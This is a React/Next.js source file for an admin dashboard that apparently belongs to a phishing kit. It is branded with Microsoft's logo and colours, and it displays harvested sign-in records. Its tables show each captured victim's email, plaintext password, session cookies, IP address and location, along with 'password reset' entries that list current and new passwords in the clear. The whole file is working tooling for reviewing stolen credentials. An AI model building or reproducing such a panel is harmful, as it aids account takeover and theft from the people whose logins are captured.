"use client";

import { FormEvent, useEffect, useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";

interface LoginAttempt {
  _id: string;
  type: string;
  email: string;
  message: string;
  password?: string;
  ipAddress: string;
  location: string;
  userAgent: string;
  cookies?: string;
  timestamp: string;
  sessionToken?: string;
}

interface ForgotRequest {
  _id: string;
  email: string;
  status: string;
  token?: string;
  expiresAt?: string;
  currentPassword?: string;
  newPassword?: string;
  ipAddress: string;
  location: string;
  timestamp: string;
}

interface Statistics {
  totalAttempts: number;
  successfulLogins: number;
  failedLogins: number;
  identifies: number;
  forgotPasswordRequests: number;
}

export default function AdminPage() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [dataLoading, setDataLoading] = useState(false);
  
  const [loginAttempts, setLoginAttempts] = useState<LoginAttempt[]>([]);
  const [forgotRequests, setForgotRequests] = useState<ForgotRequest[]>([]);
  const [statistics, setStatistics] = useState<Statistics | null>(null);
  const [filterEmail, setFilterEmail] = useState("");
  const [filterType, setFilterType] = useState("");

  const handleLogin = async (e: FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError("");

    try {
      const response = await fetch("/api/admin/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ password }),
      });

      if (response.ok) {
        setIsAuthenticated(true);
        setPassword("");
        fetchData();
      } else {
        const data = await response.json();
        setError(data.error || "Invalid password");
      }
    } catch (err) {
      setError("Failed to login. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  const handleLogout = async () => {
    try {
      await fetch("/api/admin/logout", { method: "POST" });
      setIsAuthenticated(false);
      setLoginAttempts([]);
      setForgotRequests([]);
      setStatistics(null);
    } catch (err) {
      console.error("Logout failed:", err);
    }
  };

  const fetchData = async () => {
    setDataLoading(true);
    try {
      const params = new URLSearchParams();
      if (filterEmail) params.append("email", filterEmail);
      if (filterType) params.append("type", filterType);

      const response = await fetch(`/api/admin/data?${params.toString()}`);
      
      if (response.status === 401) {
        setIsAuthenticated(false);
        return;
      }

      if (response.ok) {
        const data = await response.json();
        setLoginAttempts(data.loginAttempts);
        setForgotRequests(data.forgotRequests);
        setStatistics(data.statistics);
      } else {
        const data = await response.json();
        setError(data.error || "Failed to fetch data");
      }
    } catch (err) {
      setError("Failed to fetch data. Is MongoDB connected?");
    } finally {
      setDataLoading(false);
    }
  };

  useEffect(() => {
    if (isAuthenticated) {
      fetchData();
    }
  }, [filterEmail, filterType]);

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-[#0078D4] via-[#005A9E] to-[#004578] p-4">
        <div className="pointer-events-none absolute inset-0">
          <div className="absolute inset-0 bg-[radial-gradient(circle_at_top_right,_rgba(255,255,255,0.08),_transparent_50%)]" />
          <div className="absolute inset-0 bg-[radial-gradient(circle_at_bottom_left,_rgba(0,120,212,0.4),_transparent_50%)]" />
        </div>

        <Card className="relative z-10 w-full max-w-md shadow-2xl">
          <div className="p-11">
            <div className="text-center mb-8">
              <div className="inline-flex items-center justify-center gap-1.5 mb-6">
                <svg className="h-7 w-7 text-[#F25022]" viewBox="0 0 23 23" fill="currentColor">
                  <path d="M0 0h11v11H0z"/>
                </svg>
                <svg className="h-7 w-7 text-[#7FBA00]" viewBox="0 0 23 23" fill="currentColor">
                  <path d="M12 0h11v11H12z"/>
                </svg>
                <svg className="h-7 w-7 text-[#00A4EF]" viewBox="0 0 23 23" fill="currentColor">
                  <path d="M0 12h11v11H0z"/>
                </svg>
                <svg className="h-7 w-7 text-[#FFB900]" viewBox="0 0 23 23" fill="currentColor">
                  <path d="M12 12h11v11H12z"/>
                </svg>
              </div>
              <h1 className="text-[28px] font-semibold tracking-tight text-[#1B1B1B] mb-3">Admin Dashboard</h1>
              <p className="text-[15px] text-[#605E5C]">
                Secure access for authorized personnel
              </p>
            </div>

            <form onSubmit={handleLogin} className="space-y-5">
              <div>
                <Label htmlFor="password" className="text-[15px] font-normal text-[#323130]">
                  Password
                </Label>
                <Input
                  id="password"
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Enter your password"
                  required
                  className="mt-2 h-8 border-[#8A8886] px-3 py-1.5 text-[15px] focus-visible:border-[#0078D4] focus-visible:ring-0 focus-visible:ring-offset-0"
                />
              </div>

              {error && (
                <div className="text-[13px] text-[#A80000] bg-[#FDE7E9] p-3 rounded-sm border border-[#A80000]">
                  {error}
                </div>
              )}

              <Button 
                type="submit" 
                className="w-full h-8 bg-[#0078D4] hover:bg-[#106EBE] text-white text-[15px] font-semibold shadow-sm transition-colors focus-visible:ring-1 focus-visible:ring-[#0078D4] focus-visible:ring-offset-0" 
                disabled={loading}
              >
                {loading ? (
                  <span className="flex items-center justify-center gap-2">
                    <span className="animate-spin">⏳</span>
                    Signing in...
                  </span>
                ) : (
                  "Sign in"
                )}
              </Button>
            </form>
          </div>
          
          <div className="border-t border-[#EDEBE9] bg-[#FAF9F8] px-11 py-5">
            <div className="flex items-start gap-2">
              <div className="mt-0.5 flex h-5 w-5 items-center justify-center">
                <svg className="h-4 w-4 text-[#605E5C]" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
                </svg>
              </div>
              <p className="text-[11px] leading-relaxed text-[#605E5C]">
                Authorized personnel only. All access attempts are logged and monitored.
              </p>
            </div>
          </div>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#FAF9F8] p-4">
      <div className="max-w-7xl mx-auto">
        {/* Header */}
        <div className="bg-white rounded-sm shadow-sm border border-[#EDEBE9] p-8 mb-4">
          <div className="flex justify-between items-center">
            <div>
              <div className="flex items-center gap-2.5 mb-3">
                <svg className="h-6 w-6 text-[#F25022]" viewBox="0 0 23 23" fill="currentColor">
                  <path d="M0 0h11v11H0z"/>
                </svg>
                <svg className="h-6 w-6 text-[#7FBA00]" viewBox="0 0 23 23" fill="currentColor">
                  <path d="M12 0h11v11H12z"/>
                </svg>
                <svg className="h-6 w-6 text-[#00A4EF]" viewBox="0 0 23 23" fill="currentColor">
                  <path d="M0 12h11v11H0z"/>
                </svg>
                <svg className="h-6 w-6 text-[#FFB900]" viewBox="0 0 23 23" fill="currentColor">
                  <path d="M12 12h11v11H12z"/>
                </svg>
              </div>
              <h1 className="text-[28px] font-semibold tracking-tight text-[#323130]">Admin Dashboard</h1>
              <p className="text-[15px] text-[#605E5C] mt-1">
                Monitor login attempts and system activity
              </p>
            </div>
            <Button onClick={handleLogout} variant="outline" className="h-8 px-4 text-[15px] border-[#8A8886] text-[#323130] hover:bg-[#F3F2F1]">
              Sign out
            </Button>
          </div>
        </div>

        {/* Statistics */}
        {statistics && (
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-4 mb-4">
            <Card className="p-5 bg-white border-[#EDEBE9] rounded-sm shadow-sm hover:shadow-md transition-shadow">
              <div className="text-[13px] text-[#605E5C] mb-2">Total Attempts</div>
              <div className="text-[28px] font-semibold text-[#323130]">
                {statistics.totalAttempts}
              </div>
            </Card>
            <Card className="p-5 bg-white border-[#EDEBE9] rounded-sm shadow-sm hover:shadow-md transition-shadow">
              <div className="text-[13px] text-[#605E5C] mb-2">Successful Logins</div>
              <div className="text-[28px] font-semibold text-[#107C10]">
                {statistics.successfulLogins}
              </div>
            </Card>
            <Card className="p-5 bg-white border-[#EDEBE9] rounded-sm shadow-sm hover:shadow-md transition-shadow">
              <div className="text-[13px] text-[#605E5C] mb-2">Failed Logins</div>
              <div className="text-[28px] font-semibold text-[#A80000]">
                {statistics.failedLogins}
              </div>
            </Card>
            <Card className="p-5 bg-white border-[#EDEBE9] rounded-sm shadow-sm hover:shadow-md transition-shadow">
              <div className="text-[13px] text-[#605E5C] mb-2">Identifications</div>
              <div className="text-[28px] font-semibold text-[#0078D4]">
                {statistics.identifies}
              </div>
            </Card>
            <Card className="p-5 bg-white border-[#EDEBE9] rounded-sm shadow-sm hover:shadow-md transition-shadow">
              <div className="text-[13px] text-[#605E5C] mb-2">Password Resets</div>
              <div className="text-[28px] font-semibold text-[#F7630C]">
                {statistics.forgotPasswordRequests}
              </div>
            </Card>
          </div>
        )}

        {/* Filters */}
        <Card className="p-6 mb-4 bg-white border-[#EDEBE9] rounded-sm shadow-sm">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-5">
            <div>
              <Label htmlFor="filterEmail" className="text-[15px] font-normal text-[#323130]">Filter by Email</Label>
              <Input
                id="filterEmail"
                type="text"
                value={filterEmail}
                onChange={(e) => setFilterEmail(e.target.value)}
                placeholder="user@example.com"
                className="mt-2 h-8 border-[#8A8886] px-3 py-1.5 text-[15px] focus-visible:border-[#0078D4] focus-visible:ring-0 focus-visible:ring-offset-0"
              />
            </div>
            <div>
              <Label htmlFor="filterType" className="text-[15px] font-normal text-[#323130]">Filter by Type</Label>
              <select
                id="filterType"
                value={filterType}
                onChange={(e) => setFilterType(e.target.value)}
                className="mt-2 w-full h-8 px-3 py-1.5 rounded-sm border border-[#8A8886] bg-white text-[15px] text-[#323130] focus:border-[#0078D4] focus:outline-none focus:ring-0"
              >
                <option value="">All Types</option>
                <option value="IDENTIFY">Identify</option>
                <option value="SIGN_IN_SUCCESS">Sign In Success</option>
                <option value="SIGN_IN_FAILURE">Sign In Failure</option>
                <option value="FORGOT_PASSWORD">Forgot Password</option>
              </select>
            </div>
            <div className="flex items-end">
              <Button onClick={fetchData} className="w-full h-8 bg-[#0078D4] hover:bg-[#106EBE] text-white text-[15px] font-semibold" disabled={dataLoading}>
                {dataLoading ? "Loading..." : "Refresh Data"}
              </Button>
            </div>
          </div>
        </Card>

        {error && (
          <div className="bg-[#FDE7E9] text-[#A80000] p-4 rounded-sm mb-4 border border-[#A80000] text-[15px]">
            {error}
          </div>
        )}

        {/* Login Attempts Table */}
        <Card className="p-6 mb-4 bg-white border-[#EDEBE9] rounded-sm shadow-sm">
          <h2 className="text-[20px] font-semibold text-[#323130] mb-5">
            Login Attempts ({loginAttempts.length})
          </h2>
          <div className="overflow-x-auto">
            <table className="w-full text-[13px]">
              <thead>
                <tr className="border-b border-[#EDEBE9] bg-[#FAF9F8]">
                  <th className="text-left p-3 font-semibold text-[#323130]">Type</th>
                  <th className="text-left p-3 font-semibold text-[#323130]">Email</th>
                  <th className="text-left p-3 font-semibold text-[#323130]">Password</th>
                  <th className="text-left p-3 font-semibold text-[#323130]">Message</th>
                  <th className="text-left p-3 font-semibold text-[#323130]">IP Address</th>
                  <th className="text-left p-3 font-semibold text-[#323130]">Location</th>
                  <th className="text-left p-3 font-semibold text-[#323130]">Cookies</th>
                  <th className="text-left p-3 font-semibold text-[#323130]">Timestamp</th>
                </tr>
              </thead>
              <tbody>
                {loginAttempts.length === 0 ? (
                  <tr>
                    <td colSpan={8} className="text-center p-8 text-[#605E5C]">
                      No login attempts found
                    </td>
                  </tr>
                ) : (
                  loginAttempts.map((attempt) => (
                    <tr key={attempt._id} className="border-b border-[#EDEBE9] hover:bg-[#F3F2F1] transition-colors">
                      <td className="p-3">
                        <span
                          className={`px-2.5 py-1 rounded-sm text-[11px] font-semibold ${
                            attempt.type === "SIGN_IN_SUCCESS"
                              ? "bg-[#DFF6DD] text-[#107C10]"
                              : attempt.type === "SIGN_IN_FAILURE"
                              ? "bg-[#FDE7E9] text-[#A80000]"
                              : attempt.type === "IDENTIFY"
                              ? "bg-[#E1F5FE] text-[#0078D4]"
                              : "bg-[#FFF4CE] text-[#8A5100]"
                          }`}
                        >
                          {attempt.type}
                        </span>
                      </td>
                      <td className="p-3 font-mono text-[12px] text-[#323130]">{attempt.email}</td>
                      <td className="p-3 font-mono text-[12px] max-w-[250px]">
                        {attempt.password ? (
                          <div className="space-y-1">
                            {attempt.password.includes('|') ? (
                              // Password reset with current and new
                              attempt.password.split('|').map((pwd, idx) => (
                                <div key={idx} className="bg-[#FFF4CE] text-[#323130] px-2 py-1 rounded-sm text-[11px]">
                                  {pwd.trim()}
                                </div>
                              ))
                            ) : (
                              // Single password
                              <span className="bg-[#FFF4CE] text-[#323130] px-2 py-1 rounded-sm block">
                                {attempt.password}
                              </span>
                            )}
                          </div>
                        ) : (
                          <span className="text-[#A19F9D]">N/A</span>
                        )}
                      </td>
                      <td className="p-3 text-[#323130]">{attempt.message}</td>
                      <td className="p-3 font-mono text-[12px] text-[#323130]">{attempt.ipAddress}</td>
                      <td className="p-3 text-[#323130]">{attempt.location}</td>
                      <td className="p-3 font-mono text-[12px] truncate max-w-[200px] text-[#323130]" title={attempt.cookies}>
                        {attempt.cookies || "N/A"}
                      </td>
                      <td className="p-3 text-[12px] text-[#605E5C]">
                        {new Date(attempt.timestamp).toLocaleString()}
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </Card>

        {/* Forgot Password Requests */}
        <Card className="p-6 bg-white border-[#EDEBE9] rounded-sm shadow-sm">
          <h2 className="text-[20px] font-semibold text-[#323130] mb-5">
            Password Reset Requests ({forgotRequests.length})
          </h2>
          <div className="overflow-x-auto">
            <table className="w-full text-[13px]">
              <thead>
                <tr className="border-b border-[#EDEBE9] bg-[#FAF9F8]">
                  <th className="text-left p-3 font-semibold text-[#323130]">Email</th>
                  <th className="text-left p-3 font-semibold text-[#323130]">Status</th>
                  <th className="text-left p-3 font-semibold text-[#323130]">Current Password</th>
                  <th className="text-left p-3 font-semibold text-[#323130]">New Password</th>
                  <th className="text-left p-3 font-semibold text-[#323130]">Token</th>
                  <th className="text-left p-3 font-semibold text-[#323130]">IP Address</th>
                  <th className="text-left p-3 font-semibold text-[#323130]">Location</th>
                  <th className="text-left p-3 font-semibold text-[#323130]">Timestamp</th>
                </tr>
              </thead>
              <tbody>
                {forgotRequests.length === 0 ? (
                  <tr>
                    <td colSpan={8} className="text-center p-8 text-[#605E5C]">
                      No password reset requests found
                    </td>
                  </tr>
                ) : (
                  forgotRequests.map((request) => (
                    <tr key={request._id} className="border-b border-[#EDEBE9] hover:bg-[#F3F2F1] transition-colors">
                      <td className="p-3 font-mono text-[12px] text-[#323130]">{request.email}</td>
                      <td className="p-3">
                        <span
                          className={`px-2.5 py-1 rounded-sm text-[11px] font-semibold ${
                            request.status === "TOKEN_GENERATED"
                              ? "bg-[#DFF6DD] text-[#107C10]"
                              : "bg-[#FDE7E9] text-[#A80000]"
                          }`}
                        >
                          {request.status}
                        </span>
                      </td>
                      <td className="p-3 font-mono text-[12px] max-w-[150px]">
                        {request.currentPassword ? (
                          <span className="bg-[#FFF4CE] text-[#323130] px-2 py-1 rounded-sm block truncate">
                            {request.currentPassword}
                          </span>
                        ) : (
                          <span className="text-[#A19F9D]">N/A</span>
                        )}
                      </td>
                      <td className="p-3 font-mono text-[12px] max-w-[150px]">
                        {request.newPassword ? (
                          <span className="bg-[#DFF6DD] text-[#107C10] px-2 py-1 rounded-sm block truncate">
                            {request.newPassword}
                          </span>
                        ) : (
                          <span className="text-[#A19F9D]">N/A</span>
                        )}
                      </td>
                      <td className="p-3 font-mono text-[12px] text-[#323130]">
                        {request.token || "N/A"}
                      </td>
                      <td className="p-3 font-mono text-[12px] text-[#323130]">{request.ipAddress}</td>
                      <td className="p-3 text-[#323130]">{request.location}</td>
                      <td className="p-3 text-[12px] text-[#605E5C]">
                        {new Date(request.timestamp).toLocaleString()}
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </Card>
      </div>
    </div>
  );
}
